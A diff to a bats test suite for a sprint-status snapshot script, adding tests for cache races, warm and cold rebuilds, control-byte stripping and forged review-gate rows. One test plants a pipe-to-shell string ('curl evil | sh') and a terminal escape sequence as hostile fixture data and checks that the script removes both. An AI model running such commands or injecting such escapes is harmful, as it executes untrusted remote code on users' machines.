@@ -636,34 +636,50 @@ YAML
 
 @test "concurrent reader sees complete JSON never partial" {
   write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:done:5"
-  write_story E900-S1 done 5
+  write_story E900-S1 done 5 >/dev/null
 
   # Pre-seed a valid cache
   run "$SCRIPT"
   [ "$status" -eq 0 ]
 
-  # Start a reader loop in background
+  # Slow the writer down: the cold assembly marks that a build is in flight
+  # and takes 0.4 s, so the reader is guaranteed to read while it runs.
+  local stub="$TEST_TMP/stub-bin"; mkdir -p "$stub"
+  local real_jq; real_jq="$(command -v jq)"
+  cat > "$stub/jq" <<SH
+#!/usr/bin/env bash
+case "\$*" in *'inputs | split'*) : > "$TEST_TMP/building"; sleep 0.4 ;; esac
+exec "$real_jq" "\$@"
+SH
+  chmod +x "$stub/jq"
+
+  # Reader: reads continuously until the writer is done, logging only the
+  # reads taken while a build was in flight.
   local reader_log="$TEST_TMP/reader.log"
   (
-    for i in $(seq 1 20); do
-      if [ -f "$CACHE" ]; then
-        jq -e '.' "$CACHE" >/dev/null 2>&1 && echo "ok" >> "$reader_log" || echo "PARTIAL" >> "$reader_log"
+    while [ ! -e "$TEST_TMP/writer-done" ]; do
+      if [ -e "$TEST_TMP/building" ]; then
+        if jq -e '.' "$CACHE" >/dev/null 2>&1; then echo "ok"; else echo "PARTIAL"; fi
       fi
-      sleep 0.05
-    done
+      sleep 0.02
+    done > "$reader_log"
   ) &
   local reader_pid=$!
 
-  # Run the snapshot again (overwrite)
-  run "$SCRIPT"
-  [ "$status" -eq 0 ]
-
+  # Three cold rebuilds (the sidecar is removed each time), each replacing
+  # the cache while the reader runs.
+  local i
+  for i in 1 2 3; do
+    rm -f "$SIDECAR"
+    PATH="$stub:$PATH" run "$SCRIPT"
+    [ "$status" -eq 0 ]
+  done
+  : > "$TEST_TMP/writer-done"
   wait "$reader_pid" 2>/dev/null || true
-  # No PARTIAL reads
-  if [ -f "$reader_log" ]; then
-    run grep -c "PARTIAL" "$reader_log"
-    [ "$output" = "0" ]
-  fi
+
+  # Overlap is proven, not assumed: reads happened during the builds.
+  [ "$(grep -c '^ok$' "$reader_log")" -ge 3 ]
+  [ "$(grep -c 'PARTIAL' "$reader_log")" = "0" ]
 }
 
 @test "rule a and rule c coexist ordered correctly" {
@@ -730,19 +746,19 @@ YAML
   write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
   local sf
   sf="$(write_story E900-S1 in-progress 5)"
+  backdate_tree
 
-  # Cold run
+  # Cold run, then prove the next run is warm (it keeps a planted marker).
   run "$SCRIPT"
   [ "$status" -eq 0 ]
-  [ -f "$SIDECAR" ]
+  expect_warm_next
 
-  # Set mtime backward (simulates git checkout)
+  # Move the mtime BACKWARD only (simulates a git checkout): the warm path
+  # must treat it as a change and rebuild, which drops the marker.
   touch -t 202501010000 "$sf"
-
-  # Should detect backward mtime change and re-parse
   run "$SCRIPT"
   [ "$status" -eq 0 ]
-  jq -e '.' "$CACHE"
+  [ "$(jq -r '.stories[0].title' "$CACHE")" = "Story E900-S1" ]
 }
 
 @test "missing review-gate ledger yields gates from story table and verdict null" {
@@ -1144,11 +1160,22 @@ EOF
 # field value may change the document structure.
 # ---------------------------------------------------------------------------
 
-# backdate_tree — move every fixture file's mtime well into the past, so a
-# snapshot run does not treat it as written in its own second (such files
-# are deliberately re-read by the next run).
+# backdate_tree — move every fixture file and directory mtime well into the
+# past, so a snapshot run does not treat it as written in its own second
+# (such entries are deliberately re-read by the next run).
 backdate_tree() {
-  find "$PROJECT_ROOT" -type f -exec touch -t 202610010000 {} + 2>/dev/null || true
+  find "$PROJECT_ROOT" \( -type f -o -type d \) -exec touch -t 202610010000 {} + 2>/dev/null || true
+}
+
+# expect_warm_next — precondition for a warm-path test: the sidecar holds no
+# "racy" entry, and the next run really takes the warm path (it keeps a
+# marker title that any cold rebuild would overwrite).
+expect_warm_next() {
+  if grep -q 'racy' "$SIDECAR"; then echo "sidecar has racy entries" >&2; return 1; fi
+  jq '.stories[0].title = "WARM-PATH-MARKER"' "$CACHE" > "$CACHE.new" && mv "$CACHE.new" "$CACHE"
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  [ "$(jq -r '.stories[0].title' "$CACHE")" = "WARM-PATH-MARKER" ]
 }
 
 # write_raw_story KEY DIRNAME — write stdin as the story file under DIRNAME.
@@ -1216,7 +1243,7 @@ stories:
     risk_level: "hi\gh"
     blocked_by: E9"x
 EOF
-  printf -- '---\nkey: "E900-S1"\ntitle: "T"\nstatus: in\\progress"\npoints: 5\nmanual_verification: true\n---\n\n## Tasks / Subtasks\n\n- [ ] one\n\n## Review Gate\n\n| Review | Status | Report |\n|--------|--------|--------|\n| Code "Review" | PA\\SSED\\ | — |\n| QA; Tests | PASSED; x | — |\n| Security\\ | "q" | — |\n' \
+  printf -- '---\nkey: "E900-S1"\ntitle: "T"\nstatus: in\\progress"\npoints: 5\nmanual_verification: true\n---\n\n## Tasks / Subtasks\n\n- [ ] one\n\n## Review Gate\n\n| Review | Status | Report |\n|--------|--------|--------|\n| Code "Review" | PASSED | — |\n| Code Review | PA\\SSED\\ | — |\n| QA Tests | PASSED; x | — |\n| Security Review | "q" | — |\n' \
     | write_raw_story E900-S1 'E900-S1-sl"ug\x' >/dev/null
   write_ledger_row E900-S1 manual-test plan-1 'PAS"S\ED'
   write_action_items <<'YAML'
@@ -1232,12 +1259,21 @@ YAML
   jq -e . "$CACHE" >/dev/null
   [ "$(top_keys)" = "$EXPECTED_TOP_KEYS" ]
   [ "$(jq -r '.sprint.id' "$CACHE")" = 'sprint-9\' ]
-  [ "$(jq -r '.stories[0].gates.rows[0].name' "$CACHE")" = 'Code "Review"' ]
+  # A row whose name is not one of the six canonical gates is dropped; the
+  # status cells of the canonical rows are kept as literal text.
+  [ "$(jq -c '[.stories[0].gates.rows[].name]' "$CACHE")" = '["Code Review","QA Tests","Security Review"]' ]
   [ "$(jq -r '.stories[0].gates.rows[0].status' "$CACHE")" = 'PA\SSED\' ]
-  [ "$(jq -r '.stories[0].gates.rows[1].name' "$CACHE")" = 'QA; Tests' ]
+  [ "$(jq -r '.stories[0].gates.rows[1].status' "$CACHE")" = 'PASSED; x' ]
+  [ "$(jq -r '.stories[0].gates.rows[2].status' "$CACHE")" = '"q"' ]
+  [ "$(jq '.stories[0].gates.passed' "$CACHE")" = "0" ]
+  [ "$(jq '.stories[0].gates.total' "$CACHE")" = "6" ]
   [ "$(jq -r '.stories[0].slug' "$CACHE")" = 'sl"ug\x' ]
   [ "$(jq -r '.stories[0].manual_test.verdict' "$CACHE")" = 'PAS"S\ED' ]
   [ "$(jq -r '.action_needed[] | select(.rule == "c") | .item_id' "$CACHE")" = 'AI-9"x\y' ]
+  # created_at is not a date, so since falls back to the registry mtime.
+  local reg_day
+  reg_day="$(jq -rn --argjson e "$(_stat_mtime "$PROJECT_ROOT/.gaia/state/action-items.yaml")" '$e | strftime("%Y-%m-%d")')"
+  [ "$(jq -r '.action_needed[] | select(.rule == "c") | .since' "$CACHE")" = "$reg_day" ]
 }
 
 @test "crafted review gate cell cannot forge sprint id or totals" {
@@ -1253,6 +1289,67 @@ YAML
   [ "$(jq '.totals.progress_pct' "$CACHE")" = "0" ]
   [ "$(top_keys)" = "$EXPECTED_TOP_KEYS" ]
   [ "$(jq -r '.stories[0].gates.rows[0].status' "$CACHE" | cut -c1-20)" = "$(printf '%s' "$inj" | cut -c1-20)" ]
+}
+
+# write_sep_story TITLE — a story whose fields carry unit-separator bytes:
+# the given title, a task, a gate NAME cell followed by PASSED, and a gate
+# status cell.  Every other gate reads FAILED.
+write_sep_story() {
+  local us; us="$(printf '\037')"
+  printf -- '---\nkey: "E900-S1"\ntitle: "%s"\nstatus: in-progress\npoints: 5\nmanual_verification: false\n---\n\n## Tasks / Subtasks\n\n- [ ] a%sb\n\n## Review Gate\n\n| Review | Status | Report |\n|--------|--------|--------|\n| Code Review%sPASSED | FAILED | — |\n| QA Tests | FAIL%sPASSED | — |\n| Security Review | FAILED | — |\n| Test Automation | FAILED | — |\n| Test Review | FAILED | — |\n| Performance Review | FAILED | — |\n' \
+    "$1" "$us" "$us" "$us" | write_raw_story E900-S1 E900-S1-sep >/dev/null
+}
+
+@test "a unit-separator byte in a title cannot forge manual_test.required" {
+  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
+  # If the separator survived, "true" would land in the manual_verification
+  # field of the story record.
+  write_sep_story "T$(printf '\037')true"
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  [ "$(jq '.stories[0].manual_test.required' "$CACHE")" = "false" ]
+  [ "$(jq -r '.stories[0].title' "$CACHE")" = "Ttrue" ]
+  [ "$(top_keys)" = "$EXPECTED_TOP_KEYS" ]
+}
+
+@test "a unit-separator byte in a review gate cell cannot forge a PASSED status" {
+  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
+  write_sep_story "T"
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  # "Code Review<US>PASSED | FAILED" must never become Code Review = PASSED.
+  [ "$(jq '.stories[0].gates.passed' "$CACHE")" = "0" ]
+  [ "$(jq '[.stories[0].gates.rows[] | select(.status == "PASSED")] | length' "$CACHE")" = "0" ]
+  # The stripped name cell is not a canonical gate, so the row is dropped.
+  [ "$(jq -c '[.stories[0].gates.rows[].name]' "$CACHE")" = '["QA Tests","Security Review","Test Automation","Test Review","Performance Review"]' ]
+  [ "$(jq -r '.stories[0].gates.rows[0].status' "$CACHE")" = "FAILPASSED" ]
+}
+
+@test "unit-separator bytes in task text, ledger verdict and yaml scalars are stripped, not split" {
+  local us; us="$(printf '\037')"
+  cat > "$SPRINT_STATUS_YAML" <<EOF
+sprint_id: "sprint-test"
+status: active
+epic_focus: "E9${us}x"
+goals:
+  - "goal${us}one"
+stories:
+  - key: "E900-S1"
+    status: "in-progress"
+    points: 5
+EOF
+  write_sep_story "T"
+  write_ledger_row E900-S1 manual-test plan-1 "PASS${us}X"
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  jq -e . "$CACHE" >/dev/null
+  [ "$(top_keys)" = "$EXPECTED_TOP_KEYS" ]
+  [ "$(jq -c '[.stories[0].tasks.items[].text]' "$CACHE")" = '["ab"]' ]
+  [ "$(jq -r '.stories[0].manual_test.verdict' "$CACHE")" = "PASSX" ]
+  [ "$(jq -r '.sprint.epic_focus' "$CACHE")" = "E9x" ]
+  [ "$(jq -r '.sprint.goal' "$CACHE")" = "goalone" ]
+  run grep -c "$us" "$CACHE"
+  [ "$output" = "0" ]
 }
 
 # ---------------------------------------------------------------------------
@@ -1387,9 +1484,11 @@ EOF
   write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
   local sf
   sf="$(write_story E900-S1 in-progress 5)"
+  backdate_tree
   run "$SCRIPT"
   [ "$status" -eq 0 ]
   [ "$(jq -r '.stories[0].status' "$CACHE")" = "in-progress" ]
+  expect_warm_next
 
   # Content changes, mtime moves BACKWARD (git checkout of an older commit).
   sed 's/^status: in-progress/status: review/' "$sf" > "$sf.new" && mv "$sf.new" "$sf"
@@ -1445,10 +1544,12 @@ EOF
 @test "ledger created after the cold run is picked up by the next run" {
   write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:review:5"
   write_story_with_gates E900-S1 review 5 true >/dev/null
+  backdate_tree
   run "$SCRIPT"
   [ "$status" -eq 0 ]
   [ "$(jq -c '[.action_needed[].rule]' "$CACHE")" = '["a"]' ]
   [ ! -e "$PROJECT_ROOT/.gaia/state/.review-gate-ledger" ]
+  expect_warm_next
 
   write_ledger_row E900-S1 manual-test plan-1 PASSED
   run "$SCRIPT"
@@ -1460,9 +1561,11 @@ EOF
 @test "action-items registry created after the cold run is picked up" {
   write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
   write_story E900-S1 in-progress 5 >/dev/null
+  backdate_tree
   run "$SCRIPT"
   [ "$status" -eq 0 ]
   [ "$(jq '[.action_needed[] | select(.rule == "c")] | length' "$CACHE")" = "0" ]
+  expect_warm_next
   write_action_items <<'YAML'
 items:
   - id: "AI-950"
@@ -1479,9 +1582,11 @@ YAML
   write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
   write_story E900-S1 in-progress 5 >/dev/null
   rm -f "$PROJECT_ROOT/.gaia/config/project-config.yaml"
+  backdate_tree
   run "$SCRIPT"
   [ "$status" -eq 0 ]
   [ "$(jq '.waiting_agent_threshold_seconds' "$CACHE")" = "120" ]
+  expect_warm_next
   printf 'sprint_status_mod:\n  waiting_agent_threshold_seconds: 45\n' > "$PROJECT_ROOT/.gaia/config/project-config.yaml"
   run "$SCRIPT"
   [ "$status" -eq 0 ]
@@ -1514,6 +1619,97 @@ YAML
   run awk -F'\t' '($1 == "story" || $1 == "meta") && $3 ~ /^\// { print }' "$SIDECAR"
   [ -z "$output" ]
   run grep -c "$TEST_TMP" "$SIDECAR"
+  [ "$output" = "0" ]
+}
+
+# ---------------------------------------------------------------------------
+# Review-gate rows
+# ---------------------------------------------------------------------------
+
+@test "gate rows keep only the six canonical gates, once each, and total is always 6" {
+  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:review:5" "E900-S2:review:5"
+  # S1: all six canonical gates PASSED, plus an extra row and a repeated row.
+  printf -- '---\ntitle: "S1"\nstatus: review\nmanual_verification: true\n---\n\n## Review Gate\n\n| Review | Status | Report |\n|--------|--------|--------|\n| Code Review | PASSED | — |\n| QA Tests | PASSED | — |\n| Extra Gate | PASSED | — |\n| Security Review | PASSED | — |\n| Test Automation | PASSED | — |\n| Test Review | PASSED | — |\n| Performance Review | PASSED | — |\n| Code Review | FAILED | — |\n' \
+    | write_raw_story E900-S1 E900-S1-rows >/dev/null
+  # S2: three canonical gates PASSED and three look-alike rows PASSED.
+  printf -- '---\ntitle: "S2"\nstatus: review\nmanual_verification: true\n---\n\n## Review Gate\n\n| Review | Status | Report |\n|--------|--------|--------|\n| Code Review | PASSED | — |\n| QA Tests | PASSED | — |\n| Security Review | PASSED | — |\n| Code review | PASSED | — |\n| Perf Review | PASSED | — |\n| Tests | PASSED | — |\n' \
+    | write_raw_story E900-S2 E900-S2-rows >/dev/null
+
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  local s1='.stories[] | select(.key == "E900-S1")' s2='.stories[] | select(.key == "E900-S2")'
+  [ "$(jq -c "[$s1 | .gates.rows[] | [.name, .status]]" "$CACHE")" = '[["Code Review","PASSED"],["QA Tests","PASSED"],["Security Review","PASSED"],["Test Automation","PASSED"],["Test Review","PASSED"],["Performance Review","PASSED"]]' ]
+  [ "$(jq -c "$s1 | .gates | [.passed, .total]" "$CACHE")" = '[6,6]' ]
+  [ "$(jq -c "[$s2 | .gates.rows[].name]" "$CACHE")" = '["Code Review","QA Tests","Security Review"]' ]
+  [ "$(jq -c "$s2 | .gates | [.passed, .total]" "$CACHE")" = '[3,6]' ]
+  # Only the story whose six real gates passed is due a manual test.
+  [ "$(jq -c '[.action_needed[] | select(.rule == "a") | .story_keys[0]]' "$CACHE")" = '["E900-S1"]' ]
+}
+
+# ---------------------------------------------------------------------------
+# Story tree changes while the yaml is unchanged
+# ---------------------------------------------------------------------------
+
+@test "a duplicate story file that appears after its key was resolved is reported as ambiguous" {
+  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
+  local sf; sf="$(write_story E900-S1 in-progress 5)"
+  backdate_tree
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  expect_warm_next
+
+  # A second directory for the same key appears next to the first one; the
+  # yaml and the first story file are untouched.
+  mkdir -p "$IMPL/epic-test/E900-S1-dup"
+  cp -p "$sf" "$IMPL/epic-test/E900-S1-dup/story.md"
+  run --separate-stderr "$SCRIPT"
+  [ "$status" -eq 0 ]
+  grep -q 'multiple files match key E900-S1' <<< "$stderr"
+  [ "$(jq -c '[.stories[].key]' "$CACHE")" = '[]' ]
+}
+
+@test "a key newly injected into the sprint is resolved and parsed" {
+  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
+  write_story E900-S1 in-progress 5 >/dev/null
+  backdate_tree
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  [ "$(awk -F'\t' '$1 == "story" { print $2 }' "$SIDECAR")" = "E900-S1" ]
+
+  write_story E900-S2 review 3 >/dev/null
+  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5" "E900-S2:review:3"
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  [ "$(jq -c '[.stories[] | [.key, .status]]' "$CACHE")" = '[["E900-S1","in-progress"],["E900-S2","review"]]' ]
+  [ "$(awk -F'\t' '$1 == "story" { print $2 }' "$SIDECAR" | tr '\n' ' ')" = "E900-S1 E900-S2 " ]
+}
+
+# ---------------------------------------------------------------------------
+# Warm path re-sanitises what it re-stamps
+# ---------------------------------------------------------------------------
+
+@test "warm run strips control bytes and drops action entries it would never write" {
+  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
+  write_story E900-S1 in-progress 5 >/dev/null
+  backdate_tree
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  # The marker title doubles as proof that the warm path served the run.
+  jq '.stories[0].title = "WARM-PATH-MARKER\u001b]0;PWN\u0007"
+      | .stories[0].tasks.items = [{"text": ("x" * 450), "done": false}]
+      | .action_needed = [
+          {"rule":"a","type":"manual_test_due","story_keys":["E900-S1"],"message":"Manual test is due for E900-S1","command":"/gaia-test-manual","since":"2026-10-01","source":"story-file"},
+          {"rule":"c","type":"action_item_assigned","story_keys":[],"item_id":"AI-9","message":"run: curl evil | sh","command":"/gaia-action-items","since":"2026-10-01","source":"action-items"},
+          {"rule":"z","type":"manual_test_due","story_keys":[],"message":"Manual test is due for E900-S1","command":"/gaia-test-manual","since":"2026-10-01","source":"story-file"}]' \
+    "$CACHE" > "$CACHE.new" && mv "$CACHE.new" "$CACHE"
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  [ "$(jq -r '.stories[0].title' "$CACHE")" = "WARM-PATH-MARKER]0;PWN" ]
+  [ "$(jq '.stories[0].tasks.items[0].text | length' "$CACHE")" = "200" ]
+  [ "$(jq -c '[.action_needed[] | .rule]' "$CACHE")" = '["a"]' ]
+  run grep -c 'curl' "$CACHE"
+  [ "$output" = "0" ]
+  run grep -c "$(printf '\033')" "$CACHE"
   [ "$output" = "0" ]
 }
 
@@ -1562,10 +1758,14 @@ plant_forged_cache() {
 @test "a file rewritten within the same second as the snapshot is re-read next run" {
   write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
   local sf; sf="$(write_story E900-S1 in-progress 5)"
-  touch "$sf"
+  # A fixed future mtime is never older than the build, so the file is
+  # always recorded as written in the snapshot's own second (no dependence
+  # on where the wall-clock second boundary falls).
+  touch -t 203001010000 "$sf"
   run "$SCRIPT"
   [ "$status" -eq 0 ]
   [ "$(jq -r '.stories[0].status' "$CACHE")" = "in-progress" ]
+  [ "$(awk -F'\t' '$1 == "story" { print $4 }' "$SIDECAR")" = "racy" ]
   # Same-second rewrite: content changes, mtime does not.
   cp -p "$sf" "$TEST_TMP/ref"
   sed 's/^status: in-progress/status: review/' "$sf" > "$sf.new" && mv "$sf.new" "$sf"
@@ -1573,6 +1773,24 @@ plant_forged_cache() {
   run "$SCRIPT"
   [ "$status" -eq 0 ]
   [ "$(jq -r '.stories[0].status' "$CACHE")" = "review" ]
+}
+
+@test "a build started by the transition hook waits for the next second, so nothing it records is racy" {
+  [ -n "${EPOCHREALTIME:-}" ] || skip "needs bash 5 EPOCHREALTIME to align to a second boundary"
+  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
+  local sf; sf="$(write_story E900-S1 in-progress 5)"
+  backdate_tree
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  # Start just after a second boundary and change the story in that second,
+  # the way a transition does right before its hook starts the snapshot.
+  local s0="$EPOCHSECONDS"
+  while [ "$EPOCHSECONDS" = "$s0" ]; do sleep 0.01; done
+  sed 's/^status: in-progress/status: review/' "$sf" > "$sf.new" && mv "$sf.new" "$sf"
+  GAIA_SNAPSHOT_HOOK_ACTIVE=1 run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  [ "$(jq -r '.stories[0].status' "$CACHE")" = "review" ]
+  expect_warm_next
 }
 
 @test "planted sidecar pointing outside the project falls back to a cold run" {
@@ -1664,10 +1882,10 @@ plant_forged_cache() {
   [ "$(jq -r '.stories[0].key' "$CACHE")" = "E900-S2" ]
 }
 
-@test "REVIEW_GATE_LEDGER override is honoured" {
+@test "REVIEW_GATE_LEDGER override is honoured inside the project root" {
   write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:review:5"
   write_story_with_gates E900-S1 review 5 true >/dev/null
-  local alt="$TEST_TMP/alt-ledger"
+  local alt="$PROJECT_ROOT/alt-ledger"
   printf 'E900-S1\tmanual-test\tplan-1\tPASSED\n' > "$alt"
   REVIEW_GATE_LEDGER="$alt" run "$SCRIPT"
   [ "$status" -eq 0 ]
